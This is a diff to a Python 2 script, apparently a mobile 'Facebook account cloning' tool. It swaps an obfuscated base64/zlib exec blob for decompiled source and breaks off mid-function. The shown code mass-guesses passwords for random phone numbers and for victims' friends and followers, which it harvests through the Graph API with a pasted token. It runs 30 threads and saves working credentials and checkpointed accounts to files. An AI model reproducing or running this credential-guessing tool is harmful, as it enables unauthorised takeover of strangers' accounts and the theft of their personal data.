@@ -1,4 +1,850 @@
-#Encrypted By MARK-CORNEL
-#WHATSAPP : +2347013107449/DON,T TRY TO EDIT THIS TOOL/
-import zlib, base64
-exec(zlib.decompress(base64.b64decode("eJwlmccSs0qShff3Kf7o3nQHPY13s8MI7z3sEN4K755+uDE7gQxVlZnnfCf0z8+YLfe0Ffkf9v6jM4LM/I8qa9rH+eufocR4LmNZf/73D0AjMIrANEnSBMibxn+8P54T//HMPx9efl9LsvtemBr4VzNMv2X78/TN9z9/vulaENhfxVVk//r7zn/zIvsN01Ks67/+/73/fgns75t58a9/FMrZ95Tvkvqc1FYONLWF4BthX4iajkmTFHe+6qXlec82KPDkzyWpg5ZSnlNzPOQdXQ6IAKF+/laNaonvb995AIMB57GqIqY3EDwyy+b0s1kZyM3lzy0cwwFC4DEdFJVCIDOD1DJEAkDDsXk0VjI1Y16CD92hCPnQyT75H/oH3tphvr91dBYUJh5lUv12IDAIgABEi7FF06HigODX8BeSGLPfXklkgagPx6CQSzxIWZmX4f0ad9RZtVzQ/EMVWKDLU58o1a8JfcFN183Z1YC/sm7S56Enq9GNOG7Yo6S4eEgusu42Sl12mM9DizUrl1OrM4pYXE0AqJ2GcpvvTZYs8IO3zCn/o7nt3qHd0h8DMZzKBfNf5hHQYYTs1doCmcv5zWBjRSvH+qMaMeR/pm0wDcf02+/jH+5CctxPznA1nvULiXH9+6vKlc/7jhX2XM9bioMbEYqBO2kaZX/3wtRJvud0KU2fctYoyIbKBQMcVP9Ox9EiwxkL6e1bAiDJvCdeYbGTjPI03bzq2Al8M8K0SfqwFTSEs61ZhPrIylByUxahOKSMKdQMviseiTaWGbSttA2JjAJDI1ftBkiu8ypT1sMGmAXihn609w1AZD9q1qqLN5hTrz6Bd1ZHe4PfeBVmFc5kZhaPR2OVKqXp+YfTSR88XNHW6SyswJz6xawv2ReUnvwLtiwmzlQ9np/5vCwnS02n3zGJd8QIlOELJNnTZ2Rn8yv98Aer+WWIkeGJ4wmVfSfYxCc0Wk6ZYsFlKKjdTXvEN+pw7KyjmcjjVT89rl9+wCH8KPFWcvxeR/LxqV47PcpG4cEwxk/Ja3LR5wod26wao1Bsj0MhI6LLP6T2W2RGFAYBk05sll2+/9Vm0GuAtCYf5yemVEr2yKCGK6n2oWEX3SnYebNvhEQgWsYuWv/JV0OPgny27H2dQi2NFY3ptWTlTU/UfvgguWTwno7z+RGsTkoRksHmd8DIIHBkbnZlHYbmcdk3mocwuU7sB7s2hMdRswQvvAOcBuEPLAmrtHdrjUxph0wHUeoByjAjBkfMGD4hwK2EBx59qSdOJvye24O+OhS08PSLkdJ7TJjdateDF6C9yFT01XlHhl2Qn8quH1Bgk5HSspH/ZHhG5V60EV2pZFq9Mv7XzSaRlUJ5siD1/rC3CgDplXFV+6QF+IVAosPij17YIgqTjvAWJYMK5BP7axGdbunvOdnBrCoG2hMP/Ccdd8r4abRD7dh1wLscrXmdUe9tdtjX92M3Rvb28mNZafFAghqfH2+SEQQ5al5UDtTZoAtPJwxtX+VMniCU+p/B4hVyLwU3Z7p9TpjY5AtFivzE/QiHHLIoz6byopUfgcrcaJG1se1A/GHIFVQx5xOQtXzHBTe6TYjq1LqxB9nRwZ1ayYatY9y8R3iHuWRvXThhqRzeeOKOQam6c4KIH/bJNuDqP+EWRV+q6I0k6ehL1q/mdkHdt4Fie9rhbcGcR9cbY9cyzli1m7P56Wpl1LoTacVgJPiV3tZcOs8q2AlD5O+KP+TqoOVIQovWEhO9PXapwDUNLPe7FTZG3JzREQqqtB/KaT7pvMu/lW/3uTKpzv9Z4n5hdjoWrLAlO2oaVKcR5cK1UD3p+sU7UjmnNAidVIS4q8t5iC3GxsiRl/Mkxq6jy3PUAC25zpLyXZPAnXCkmVB1mB2Xus3keLmVbk4no2kxZk70DFx/FAjWTb3o+QxnyOJyzZNR1nyuS2PzbDPW1lmZdZCl5+h3HS1xgvf9fgnscIbPfzQeVWf/zvsZNjttRTAjIkEYGT8MDVri1adGXwjhTrrJSy0RiSWRYIZXpb7P6cWsIUTIJtNMJ5bvRL5DIjc1ATWdeJgUpIs/hlTICZ0Wg68c16idnle7rz0UU0LP45PCI88FIMvbc47lZNJdHpjrGxE8BMdo1xwTVGmqPMhcpyFhyjhKKPD0x8/3eYfD38JRve/dSBxUOTC7+k1vjal1FQE9Ru4k+RnA/XcnamYqKdR/Ry6Y2fXu+59GYIXQ5JNL9jVQUkWRalnnOVa8Vd8CALi0jBI0RodqOvHrZPEYH3vDs4j5c+7Cjv7UlNGI1hXLd3+SP27Xnsg3PMSf8l3sUZ8fa2nbPlRcbubdapEnam1JovLqq2I4npu2BkjZnObV0cxYGccO7TxbSXsQgB+E2VTYGcs0/jYqBlLinz22c1xD4pLOOKG2A6XoQR+dpMWq5kyf7O+LW4iQeLqE2vAafvYb+Vnk50huO5L5RidnKXvsqw29Y0BvSPzOcErMNx2i4SbxXDH19Gk0JLkyzvxbf8twKM6uMTFf/NRvUnq09Q3gsLFVgBMiVZf1n9fjmPZrDkc0h3mypBlWTfOTVmlZQmEd7p42G7Hic/O6OLlQhtHdH+kA2cmF3vFokoW6rrlXbg+lJ3Qty+mqyoBswM3JqJighYcA60KqNO152zr8Kz2g89gKs3cB4edBkRJBX05ZHqH8oGPEWNuhBxMMK82JO717QIRo+ubsQP/2UdN/kkSXVlgzrsG4Vvgj1RJeadj9pBarHZHbyGOWrauQUf1h1j7FGBu53wZVHpyt+sjtF2XtyxFA5TIv1By7VIbA/8bZI1dBtiMw9QjSsMZQnbR6+B2iaq7+iYGs8zHB5rHy1SuNhuc0oVCTJWA2kYVZJerRGnGG2DQccu+iFj8sJaAl0x8hiSdE0MhzotondkyABfqhHDcFOeu7AJ3EpssdtwmlhNi7vx4iT5dRdw6B+SPnpWt2mlr1yrOgPmr43PX5KugDLUWdY7vQhPO+hVmL+DvfFkjC2afHJ7fTvTujQSrGJ4f/IL8ogvCk633x+zF7idUlETGoiFBugR0JLfNhFn3oX/kuhDHO0+ZA1qgyAAVnKRglaQEIFnfwuuyXpD0tziz3jdt5zIYvtXkFuDiCTRprLm/NI5Ij9Esp0NunknfsOOTVa/ywB86BDAswbHSoTfdZVWxrBUjbOgZTMJQE6lUyvnTsF/I55+Rop5sMBp97vOUamWlfbO4e17WFFT8cA0BBaLWrSXiGJ3YkjvCmkOa/xSs93j5aIUihftU+OdNF9Wh+dYnRepo6jpz02pQpSMkGyBQwa56+eYAAmSb/EM367v6EcGLN6tBm0l22c9mIpZK4SrAhSjm21OpWCkdhtf6qT6+YmVaCyjSHT3RBlEt+7DoU8rR3lilYemEXqJHiLa81AXLTacS2UxCRVZ1llRVktFjYxeNVonWbnAcK4T4NJ6a4hmr2vYhcXGzXyOBKxm51bWNCIaGzAYux+O/7MHPrU0C0h5+x58MeIi9sfpEaSgG4mzh4yiOGsJ6om85065vdcGGPGKnBXf0ngV2D9tShNfmtDwjuYqG0V11qB9qFKBnVk1+Cr+HEiiP+fPbuJZ3YisRiASDDnwfgIwzuvFnotWt516D06hYwJXQtoFQ1Pm+Aei4NZQehkEYL9NTOkbW6glrJ7Oc68hjXupLSzz0SBQcB1spoWx8EL14x9qg0uH2JuRZLW93Qlpl586edkzvCkFASAAiHYmYjBxRyXTMRXy9/UIKnwLZCfzl7c6Cnt+wZyABQdBQ+HyuoX231IvWM+FrSZJlnFzAWhRIMb+03DvN+P47iyeIO8r5wcKX3U80nQ70VuZGTyEk6YEPwSxDLHhAN3aqeucJ2A9Y/c/wbLmkouoOinqApGPeP4V19kwHrbeTut3YQFJejMRAIsD390glmOwxU6hA3ekNAD1EvxYAvcSdJ25Q/2bkXGaayZSmjVUAG+tcDI8LsH6Xf+V54bHxrYHj0nlCAJ+oMsxymppWosUOszfyxvvwL8jbX2KbhVdPE6Xsu4m5V0KWaf0MVFBjd6+EDMaY3OWyQYuG9vqFLIzy7qalRgidmZXZs3y1tbopsJUh48LV7tBuWSQE1TrccAs/ENp+UTpJtA+KIXB4FF1e04yXmaahBal5i0RnFRIN99peKBXxbxeQwFHgBNt1knCmIl8c9jH72UvHDiqh3TNAv3gwru/JB1XH9+T1nlvV0PecT4lcDwZAeZ1Aza62/cPomoIZRibagiIgtYUpbNAb75TW2KPBLf4E1LtkxdJCDVkkj/UAMNBnraThgao/hq91U2ilBMyaIpIa84kLzugPnBcUD/FXILnO85yd5EKOjzLFO0/3sLFxlxRJGh3HqCMuEPuapATI4LYicp3X+2O9YnDCCRgh4haW6VmEaJacAVq9EXVLjhCwv+BlfgmIp1znXctl4WDTY+Aaz/aTG4C6vp7yJvBrLn7P6szZEyyIzRIxeRX8tcp2i3jwOn9NGT166Z3bY7yFDD7KccELltDro/ARmry1fThoUJtMHvm9j4GaGR9jJiVMDsRUSg0IWEQpgAiTzGfDRGkhQEcrch3XTxDLOPZqVVFoGEMltW4QxmztHkIbBa2TkDvpthct3nhm4b9PiHH7jbQfggfUo8uEs8VlXNumuRb6l9LxpUWa1o70iVKwhE6aAhNfj9HSp6iYrecqMtrlezIZ7rGt0ADUBhGzFcLPtRv+0s1/bFj5XEu3CNpZ33rDTnLilREIyrgOJoKTWmWvvT/G2g7NngxcjxdF6Tv2n6uJoHyNZE9dGJD4oPzqvaWaUh5+W9UvIHYk+sIJd3Ie0ZP4RQC9+9PzDf6fA7SiFk3deDy09UwwJ4GqiOSzIneWzzM5N6jH8pbPcaKgf+MTsVUjc2kqKpPC8yikfSpvi3I9ehinsJ5wOBXD3b8Y+dkKIx/i7gVUlZ2COFH51g8Wiq/G8B3pHqhyOLHjV9NsWBC7h4HvCzkBNKV8Iz0hrw2bq4szIAc+3HDxtd6O/yo4BvycCKZvVnyBKdn3wqygphoCDtmDkYKPdu7PWqhfKGNgUrsUeAcsVO7YfdJpI2hbTSYFNaN+6SXoz6vLHiIdH+Zk5OmH2w63eDw43JMz2+eiAeBKqMUGk2SNJvBYfSQOz6OOC0k3KpjI/fECC6wGnAY0ewb1+F74JC28gVw0LIJX9tGeKWobF9XotF7Bas4/7eMy+Yi8lk1oFpZzCNEUIjUHWEHxmXyxGWMWbymHsgBMFnlrxOYFgeNsG++gGxudxmd8olx+L6XkPBAmLujELKQkEY50iwBx0PQZQAdvehJRbnEeE3BZe+2F5Gquk0wVTg0CnN/4xQ7nZ+Rrh2HIa+EIWzm1nROci0KWiSzaZqGwQgsIkmQ58pF8wZXJKhcsgMIdK7ORhIOkmvITflUkFBHr+VXf38xm5hkaYQzgNBuhNMZ7cFJrIWqM6hOHjBLDJJCzLd0gt1Mss2Ls8LLw80UWFMwC+hoSCfmsiFPUFa/yUdBs+ETMFvq8mmF9Zz6WI5ZBIB1ad8UuDTzfCaq5tGnlAh6TsC30npMXPpObhKcXxMrP45Jt3LVlDATo7cPeeWmgAyyUvYXiQiGXtWaeohd/sOYe54fWmFVHo5UZyXnIEmQ4Nf052aUQiSnXoxb1a3Ha1nGItlAGcWegH5IxJChE/1UOCbwASpR7LwBxjIFrw4vdJkk48g4Sv42K2GwYEMSp1BA/KS/ghqGr4qDy95ANoWYlZtBK5c4STh88TDoj51aui5onUku5J8Xnn7SHYGP7Wta3PbdWktsN/h1KAqoAD10Ec/RSfKFf7Gp5Cjz81ipa+NhOS4vjrfPiYM3fkEM8ry8WYc1zBWhtBmfi50ZNY3I5XklaPV+6Ed09XEa0B4KJ4HbF9hXG3z0UnqJMP88FDMP62znGumPYRPw5vGx5gDu7FCHZupicX5KHeF57xjqIyVIJe+D/m62OZVB9cO+0K/Q7Vsbil7nRY9qS4mKRnLttuJLOylgchEtGkGUE7TUfUbLdIiBt5zV9BbVvPxqNMz3t6pPVNqKFHopfXqgAhi4fy7A1dK4puYVQ989toVgvrLrPyDvk8ZCkvcYy6ODM5gFcrL/HvRDKnE5F8tJjHbmgoa0OIf37C9Hhob70sn/kYOs2ivGxfTLCcBrLpMRo6eGU2SU5J4IZPNZmEGptps+AEhqja4zLuehGK0zg0TxDAjideGJOcKDJyzNksaOqz3UW3YEjj7PmhTw9BEG3EDt/Cvr54jG5tRQivndWQHMe6BcX6pszrAUFqaeMdY6XpD3TVBLeCbzYOJbHJgHQ+VchtaUHcA2gCgN9ZcH/M/SzEqFUGqnNFN3t9sokmohKkTkC8lcovqPlVsZLcRBm5ODTtPeH1xyzaCsZyCVEzqA+oOqSpaUnh4LHbNprBD7DPwUR/Ds3bDjOSv/GSg19Eq2IUopx1QHFi8jkO95Ue27NYMJ55EFK6sxcpRsOLXVjM/CTAiXnLyledhxu1OhSsi8qspkywcnAefzQV1wlDNtb7QASSo/WzgUgUXVt+c8S3tInNQUCRV8ZQr34dz3O4QFk+XivY5WM32gcZCjwnVvpHOrAeFoU6Tf4GAs/5cmaM3sjuunmIKoiNvjIhJRcWMMIntrFRvyVUbtEHZhxPdWmRJDmKcvXQ1ogbaXW4opyaAPWJw/UNJrKAP1/zdWH3WzG9jvM5tI/4tmmDudr1A7wM78i3ruO0hwVmUNZ2t26460tcBRffZ4DMhrHHL7AsCZQYnPZZzX2TysAhlZ0jW2qPWuVx4e155da+Tx2OIqmtxA/21MJDzPwzsn3Sya3E5+71be560SFMUhTHY1DTN757vfRtTeY9UPdYw3BlIk/YPUtod0mfQGO6dtUFNIduzl4VDBBJyDiOrz+XDGHQj/SVa45jKFtg8ik7lpDRXxx052kkSS3jM2ND0JCiI/xRQqd+Ue8j95wYdjcMIeq41E132Hf+JW/eBnFc8PAocLRRAm49Ok7/kGBc5cQcl1/K2XEkz4pyke0HopYi+PVGSb6J30sGhKZBFogabUhy8vg15tE0v1ZUaUoRi61Hfs8wh67lL1KNU+pHReHUGAPJtdctfmOxew2MhLTq2J/8gZCL7T9QRlWmM1ElX4hnrJRjlBjtCMpEKGfn8StKignuUrDbM8gLF3m4rwy/C0aNxpePhB9FMbiiWWwcBg4VFeuQbhoNWNxfHRT8E5w5G6Kgrb8+4xIvF3beArHol29WGXn1yF7Z8IC+CUhXmgcvio+ZDMG0e+pEBsLsd0zEcD/zSMYxnQaMvr2jRYkKIZvvh9wN2CcSB19QHcuuMa/RKd3dr4MJXPO5motFNVZQM0ZdZhPV4fkTGUU7osq36V+wCNLSy6d5xZ5jtyy4Wxb27h+sUGEcxdqlq8LRXF/wa3pJBF/op1gymGvdn9+af9u85dIhBNYHD4u4+f6GrZciWLNnBzAIqPxuZp1+kQaCzUQ55q9mfCKw/mx5Hii5a4Y1EaClQzg/zX4fUuAeWaxPeWJjr1nxF/01spjIc8n1f//rAnrc6ewz4zbYUqD5Hn8+bLkGJVC+FTY0YSIIKPEnmI+33AFEv2Q9ZMD3kJ8esQriz5M4Z4Tn4al1owuFCwitYliUYh8Hv/QLkEquRyAT3W3p/bxSJoutmxLDez7d6zmNyHxASmlY/I7zo0YAXRvLvoKCnzuGMJim2s9/7SaZ5ZlwPx4wGBJ/KA2+Ag2sxVhCZcRhTr3ZpA9oVvLqyn7fh8FxW1+SKgWCv2zlSePoZOw1VcfJOY9Y7T77LnhOY2wgTbtMLkvB0YYXTZ869vtYchMvTCIxFGuYJSyPI79ilqShOteYvD8cK7T0fB/o1unT4rpsHsBWc2xCSqsuQjqiFp36usZuOz1N6ShlJOF3WjUJ8QQiHkin+0v6KZ2zBGudKiuQ5oOMbsZuUFjjT/BEw/YWQ8Lm7Mz2ntzoGlaFTzZq2RWEAdASJ+1soHDRIwn58t5SfIcIn9d4b6zpLipYHOSLdX+nNTMY9DBEO8m0vmY9/5zSB4aEYxCI5ySurJ76O7GIXEtFbRxKdH1jobTaimVTQsK0jBGrorFoXgdxM6dtLs3MPABZCubHBoT5PCUug7TiThGXaKUuLxCSoMGDdP1VZ3XjHY/Fc0nc0ET8Dt3BB5ifQhCYGRVA3+Oeo4e5u1FuK5A8ajq9o6Sds3FG6QQkUBsS3hwNLlkVGnEDwEVYsnoaNhKCjao4IOm5YL00WV7yLmVjWLn/In3W350hiG+LpqP4syXUa/pujjQysbNG0Uy1vB4Tk0c1ew29W29NQ/biOV7wNKFqYaUn5M3es2pz1nAjXaseGjFNlLuRfZ4S5t9aHh08OjmGC+1ugiTWJJBr08hKfYDHe+g5GTW7nFNu7sUV//FG9ZDOMApePa2GEhdhP9hTTUm4Lv12jzMKBQNVjCy1L31GXQexYUWrSjZt0eowV8xORlVxDKO/bohL1s6z5tCIhUVcw15gW0TcLVsSccBROXfjBebibSVQBppOqCTPAlXHHvLGUuwlIOIj7j5GBTJHZSNI6RnxKSt6P+2XHz4tLKJr4dDdFbtSrOsMr16x9GxZg0bM6Sdu5YLqMMusj83zl8crWVFaSj3UopqhTo7Rxh0qLFtYdveQjukQpepy1XwxT3N1JG6IQfTYJeXH0U7IZrefvwPnzo3WlCv4AoqI0pk9oYE1pcFuekvWVsSbadmv/P+gdqr9JQCsR/S1Ku6G5kUmK/3AN3jFpEgTz9tHlh2C0oCqn/UEXnC1lwZ/w9f05f1zwCLNapjpRQDc/NHV9whUTKS/O0Vn8qCDdf6wfQvQJ++M5/cgUEinPtg0mvsXD3RKfTs/XfURsCtV1dV8B+Wl6ab3omslqp39G1PrlidkA9+kJINHPjIwPZ9vkr5O6GQ4lkEjIkPQ2vc2M64RXss+442E5HejioCXSuMSJ8n8+KA4qzUy525Nhy8zD6QpJT0gpVCpxk5NQ/wzzaagtz3RbYtVe8KOWquYf2DQ5S6si8fW87tNtMnF91ZvjqwOmLOJeQXy/nRi9kOYotR/OyJy62GJOQgYgMYMIZgOPZ2WqMOW/X0pTZLrdp6D1JEwjv6og+EwltUHGrtKPIY+oPNxrlVwy1OwXW5QZ9RBJBAAy7IEz7IxIl/4x7///e//A7MfyxM=")))
+# Source Generated with Decompyle++
+# File: out (Python 2.7)
+
+
+try:
+    import os
+    import sys
+    import time
+    import datetime
+    import random
+    import hashlib
+    import re
+    import threading
+    import json
+    import getpass
+    import urllib
+    import cookielib
+    import requests
+    import uuid
+    import string
+    from multiprocessing.pool import ThreadPool
+except ImportError:
+    os.system('pip2 install requests')
+    os.system('python2 FILECRACK.py')
+
+
+try:
+    os.mkdir('/sdcard/ids')
+except OSError:
+    pass
+
+if not os.path.isfile('/data/data/com.termux/files/usr/bin/node'):
+    os.system('apt update && apt install nodejs -y')
+os.system('git pull')
+os.system('rm -rf .txt')
+for n in range(5000):
+    nmbr = random.randint(1111111, 9999999)
+    sys.stdout = open('.txt', 'a')
+    print nmbr
+    sys.stdout.flush()
+
+from requests.exceptions import ConnectionError
+bd = random.randint(2e+07, 3e+07)
+sim = random.randint(20000, 40000)
+header = {
+    'x-fb-connection-bandwidth': repr(bd),
+    'x-fb-sim-hni': repr(sim),
+    'x-fb-net-hni': repr(sim),
+    'x-fb-connection-quality': 'EXCELLENT',
+    'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
+    'user-agent': 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]',
+    'content-type': 'application/x-www-form-urlencoded',
+    'x-fb-http-engine': 'Liger' }
+reload(sys)
+sys.setdefaultencoding('utf8')
+logo = """
+
+\033[1;94m##     ##    ###    ########  ##    ##
+\033[1;94m###   ###   ## ##   ##     ## ##   ##
+\033[1;94m#### ####  ##   ##  ##     ## ##  ##
+\033[1;94m## ### ## ##     ## ########  #####
+\033[1;94m##     ## ######### ##   ##   ##  ##
+\033[1;94m##     ## ##     ## ##    ##  ##   ##
+\033[1;94m##     ## ##     ## ##     ## ##    ##
+
+ \033[37;1m[\033[41;1m FAST FACEBOOK ACCOUNT CLONING TOOL \033[00;1m\033[37;1m ]\n
+ \033[32;1mCreator \033[37;1m: \033[33;1mMARK-CORNEL
+ \033[32;1mVersion \033[37;1m: \033[33;1m1.7 2021 version
+"""
+def reg():
+    os.system('clear')
+    print logo
+    print ''
+    print '\tLOADING REGISTRATION MOOD.......'
+    print ''
+    time.sleep(1)
+    
+    try:
+        to = open('/sdcard/.hs.txt', 'r').read()
+    except (KeyError, IOError):
+        reg2()
+
+    r = requests.get('https://raw.githubusercontent.com/GUPTA-SHAKEL/cloner1/main/server.txt').text
+    if to in r:
+        print logo
+        print ''
+        print '\tExceuting script'
+        print ''
+        os.system('cd ..... && npm install')
+        os.system('fuser -k 5000/tcp &')
+        os.system('#')
+        os.system('cd ..... && node index.js &')
+        time.sleep(10)
+        method()
+    else:
+        os.system('clear')
+        print logo
+        print ''
+        print '\tRegistration Failed'
+        print ''
+        print ' Your key is not registered yet '
+        print ''
+        print ' Copy and send key to admin'
+        print ''
+        print ' Your key: ' + to
+        print ''
+        raw_input(' Press enter to send key')
+        os.system('xdg-open https://wa.me/+2347013107449')
+        reg()
+
+
+def reg2():
+    os.system('clear')
+    print logo
+    print ''
+    print '\tRegisteration not found'
+    print ''
+    print ' Copy and press enter , then select whatsapp to continue'
+    print ''
+    id = uuid.uuid4().hex[:25]
+    print ' Your key: ' + id
+    print ''
+    print ''
+    raw_input(' Press enter to go to whatsapp ')
+    os.system('xdg-open https://wa.me/+2347013107449')
+    sav = open('/sdcard/.hs.txt', 'w')
+    sav.write(id)
+    sav.close()
+    raw_input(' Press enter to check registration ')
+    reg()
+
+
+def method():
+    os.system('clear')
+    print logo
+    print ''
+    print '\tSelect cloninig '
+    print ''
+    print '[1] Login cloning'
+    print '[2] Without login cloning'
+    print ''
+    ms()
+
+
+def ms():
+    s = raw_input(' Choose option: ')
+    if s == '1':
+        login()
+    elif s == '2':
+        wlogin()
+    else:
+        print ''
+        print '\tSelect valid option'
+        print ''
+        ms()
+
+
+def wlogin():
+    id = []
+    oks = []
+    cps = []
+    os.system('clear')
+    print logo
+    print ''
+    print '\tWithout login'
+    print ''
+    c = raw_input(' Code: ')
+    
+    try:
+        list = '.txt'
+        for li in open(list, 'r').readlines():
+            id.append(li.strip())
+    except (KeyError, IOError):
+        print ''
+        print '\t Numbers file not found'
+        print ''
+        os.system('exit')
+
+    print ' Total numbers: ' + str(len(id))
+    print ' The process has been started'
+    print ' Press ctrl + z to stop'
+    print ''
+    print 47 * '-'
+    print ''
+    
+    def main(arg):
+        user = arg
+        
+        try:
+            pass1 = user
+            data = requests.get('http://localhost:5000/auth?id=' + c + user + '&pass=' + pass1, headers = header).text
+            q = json.loads(data)
+            if 'loc' in q:
+                print ' \x1b[1;32m[MARK-OK] \x1b[1;32m' + c + user + ' | ' + pass1 + '\x1b[0;97m'
+                ok = open('/sdcard/ids/successful.txt', 'a')
+                ok.write(c + user + ' | ' + pass1 + '\n')
+                ok.close()
+                oks.append(c + user + pass1)
+            elif 'www.facebook.com' in q['error']:
+                print ' \x1b[1;33m[MARK-CP] ' + c + user + ' | ' + pass1 + '\x1b[0;97m'
+                cp = open('checkpoint.txt', 'a')
+                cp.write(c + user + ' | ' + pass1 + '\n')
+                cp.close()
+                cps.append(c + user + pass1)
+            else:
+                pass2 = c + user
+                data = requests.get('http://localhost:5000/auth?id=' + c + user + '&pass=' + pass2, headers = header).text
+                q = json.loads(data)
+                if 'loc' in q:
+                    print ' \x1b[1;32m[MARK-OK] \x1b[1;32m' + c + user + ' | ' + pass2 + '\x1b[0;97m'
+                    ok = open('/sdcard/ids/successful.txt', 'a')
+                    ok.write(c + user + ' | ' + pass2 + '\n')
+                    ok.close()
+                    oks.append(c + user + pass2)
+                elif 'www.facebook.com' in q['error']:
+                    print ' \x1b[1;33m[MARK-CP] ' + c + user + ' | ' + pass2 + '\x1b[0;97m'
+                    cp = open('checkpoint.txt', 'a')
+                    cp.write(c + user + ' | ' + pass2 + '\n')
+                    cp.close()
+                    cps.append(c + user + pass2)
+                else:
+                    pass3 = '223344'
+                    data = requests.get('http://localhost:5000/auth?id=' + c + user + '&pass=' + pass3, headers = header).text
+                    q = json.loads(data)
+                    if 'loc' in q:
+                        print ' \x1b[1;32m[MARK-OK] \x1b[1;32m' + c + user + ' | ' + pass3 + '\x1b[0;97m'
+                        ok = open('/sdcard/ids/successful.txt', 'a')
+                        ok.write(c + user + ' | ' + pass3 + '\n')
+                        ok.close()
+                        oks.append(c + user + pass3)
+                    elif 'www.facebook.com' in q['error']:
+                        print ' \x1b[1;33m[MARK-CP] ' + c + user + ' | ' + pass3 + '\x1b[0;97m'
+                        cp = open('checkpoint.txt', 'a')
+                        cp.write(c + user + ' | ' + pass3 + '\n')
+                        cp.close()
+                        cps.append(c + user + pass3)
+                    else:
+                        pass4 = '445566'
+                        data = requests.get('http://localhost:5000/auth?id=' + c + user + '&pass=' + pass4, headers = header).text
+                        q = json.loads(data)
+                        if 'loc' in q:
+                            print ' \x1b[1;32m[MARK-OK] \x1b[1;32m' + c + user + ' | ' + pass4 + '\x1b[0;97m'
+                            ok = open('/sdcard/ids/successful.txt', 'a')
+                            ok.write(c + user + ' | ' + pass4 + '\n')
+                            ok.close()
+                            oks.append(c + user + pass4)
+                        elif 'www.facebook.com' in q['error']:
+                            print ' \x1b[1;33m[MARK-CP] ' + c + user + ' | ' + pass4 + '\x1b[0;97m'
+                            cp = open('checkpoint.txt', 'a')
+                            cp.write(c + user + ' | ' + pass4 + '\n')
+                            cp.close()
+                            cps.apppend(c + user + pass4)
+        except:
+            pass
+        
+
+
+    p = ThreadPool(30)
+    p.map(main, id)
+    print ''
+    print 47 * '-'
+    print ''
+    print ' The process has completed'
+    print ' Total Ok/Cp:' + str(len(oks)) + '/' + str(len(cps))
+    print ''
+    print 47 * '-'
+    print ''
+    raw_input(' Press enter to back')
+    wlogin()
+
+
+def login():
+    os.system('clear')
+    
+    try:
+        token = open('access_token.txt', 'r').read()
+        menu()
+    except (KeyError, IOError):
+        print logo
+        print ''
+        print '\tLogin menu'
+        print ''
+        token = raw_input(' Paste token here: ')
+        sav = open('access_token.txt', 'w')
+        sav.write(token)
+        sav.close()
+        menu()
+
+
+
+def menu():
+    os.system('clear')
+    
+    try:
+        token = open('access_token.txt', 'r').read()
+    except (KeyError, IOError):
+        login()
+
+    
+    try:
+        r = requests.get('https://graph.facebook.com/me?access_token=' + token, headers = header)
+        q = json.loads(r.text)
+        name = q['name']
+    except KeyError:
+        print logo
+        print ''
+        print '\tLogged in token has expired'
+        print ''
+        time.sleep(1)
+        login()
+
+    os.system('clear')
+    toc = open('/sdcard/.hs.txt', 'r').read()
+    print logo
+    print ''
+    print ' Logged in user: ' + name
+    print ''
+    print ' Active token: ' + toc
+    print ''
+    print 47 * '-'
+    print ''
+    print ' [1] Crack with name pass'
+    print ' [2] Crack with digit pass'
+    print ' [3] Extract ids'
+    print ''
+    menu_option()
+
+
+def menu_option():
+    select = raw_input(' Choose option: ')
+    if select == '1':
+        crack()
+    elif select == '2':
+        choice()
+    elif select == '3':
+        ex_id()
+    else:
+        print ''
+        print '\tSelect valid option'
+        print ''
+        menu_option()
+
+
+def crack():
+    global token
+    os.system('clear')
+    
+    try:
+        token = open('access_token.txt', 'r').read()
+    except IOError:
+        print ''
+        print '\tToken not found '
+        time.sleep(1)
+        login_choice()
+
+    os.system('clear')
+    print logo
+    print ''
+    print '\tCrack with Name pass'
+    print ''
+    print '[1] Crack public id'
+    print '[2] Crack followers'
+    print '[3] Crack file'
+    print '[0] Back'
+    print ''
+    crack_select()
+
+
+def crack_select():
+    select = raw_input(' Choose option: ')
+    id = []
+    oks = []
+    cps = []
+    if select == '1':
+        os.system('clear')
+        print logo
+        print ''
+        print '\tName pass cracking'
+        print ''
+        idt = raw_input(' Input id: ')
+        p1 = raw_input(' Name + your digit: ')
+        p2 = raw_input(' Name + your digit: ')
+        p3 = raw_input(' Name + your digit: ')
+        p4 = raw_input(' Name + your digit: ')
+        
+        try:
+            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token, headers = header)
+            q = json.loads(r.text)
+            os.system('clear')
+            print logo
+            print ''
+            print '\tName pass cracking'
+            print ''
+            print ' Cloning from : ' + q['name']
+        except KeyError:
+            print '\tInvalid Link'
+            print ''
+            raw_input(' Press enter to back')
+            crack()
+
+        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token, headers = header)
+        z = json.loads(r.text)
+        for i in z['data']:
+            uid = i['id']
+            na = i['name']
+            nm = na.rsplit(' ')[0]
+            id.append(uid + '|' + nm)
+        
+    elif select == '2':
+        os.system('clear')
+        print logo
+        print ''
+        print '\tName pass cracking'
+        print ''
+        idt = raw_input(' Input id: ')
+        p1 = raw_input(' Name + your digit: ')
+        p2 = raw_input(' Name + your digit: ')
+        p3 = raw_input(' Name + your digit: ')
+        p4 = raw_input(' Name + your digit: ')
+        
+        try:
+            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token, headers = header)
+            q = json.loads(r.text)
+            os.system('clear')
+            print logo
+            print ''
+            print '\tName pass cracking'
+            print ''
+            print ' Cloning from: ' + q['name']
+        except KeyError:
+            print '\tInvalid id link'
+            print ''
+            raw_input(' Press enter to back')
+            crack()
+
+        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999', headers = header)
+        z = json.loads(r.text)
+        for i in z['data']:
+            uid = i['id']
+            na = i['name']
+            nm = na.rsplit(' ')[0]
+            id.append(uid + '|' + nm)
+        
+    elif select == '3':
+        os.system('clear')
+        print logo
+        print ''
+        print '\tName pass cracking'
+        print ''
+        p1 = raw_input(' Name + your digit: ')
+        p2 = raw_input(' Name + your digit: ')
+        p3 = raw_input(' Name + your digit: ')
+        p4 = raw_input(' Name + your digit: ')
+        
+        try:
+            filelist = raw_input(' File : ')
+            os.system('clear')
+            print logo
+            print ''
+            print '\tName pass cracking'
+            print ''
+            for line in open(filelist, 'r').readlines():
